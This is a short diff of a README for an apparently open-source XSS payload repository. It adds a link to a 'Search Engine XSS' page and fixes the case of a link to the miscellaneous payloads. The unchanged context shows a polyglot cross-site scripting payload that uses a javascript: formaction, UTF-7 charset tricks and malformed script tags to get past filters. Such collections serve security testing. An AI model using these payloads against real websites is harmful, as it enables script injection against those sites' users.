@@ -75,8 +75,11 @@ This is an open source repo. Anyone can contribute. :beers: <br/>
 ```
 <div id="1"><form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>//["'`-->]]>]</div><div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["'`-->]]>]</div><div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["'`-->]]>]</div><div id="4">0?<script>
 ```
+## Search Engine XSS
+[seXSS](D4rkXSS/seXSS.md "seXSS")<br/>
+
 ## Misc Payloads
-[Misc](D4rkXSS/misc.md "Misc")<br/>
+[Misc](D4rkXSS/Misc.md "Misc")<br/>
 
 ## Basic Payloads
 [Basic](D4rkXSS/basic.txt "Basic")<br/>
